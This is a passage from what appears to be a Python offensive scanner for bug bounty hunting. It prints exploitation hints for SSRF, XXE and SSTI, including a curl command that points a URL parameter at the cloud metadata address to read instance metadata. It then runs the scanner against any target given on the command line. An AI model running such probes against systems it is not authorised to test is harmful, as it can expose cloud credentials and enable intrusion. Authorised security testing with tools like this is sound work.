            print(f"  curl \"{endpoint}?url=http://169.254.169.254/latest/meta-data/\"")
            
        elif vuln_type == 'XXE':
            print(f"\n[XXE]")
            print(f"  Exploit with out-of-band data exfiltration")
            
        elif vuln_type == 'SSTI':
            print(f"\n[SSTI]")
            print(f"  RCE possible - test with OS commands in template")

# Main execution function
async def run_scanner(target: str, aggressive: int = 8) -> Dict:
   """Run the bug bounty scanner"""
   scanner = BugBountyScanner(target, aggressive=aggressive)
   return await scanner.scan()

if __name__ == "__main__":
   # Standalone execution
   import sys
   
   if len(sys.argv) < 2:
       print("Usage: python elite_api_hunter.py <target>")
       sys.exit(1)
   
   target = sys.argv[1]
   asyncio.run(run_scanner(target))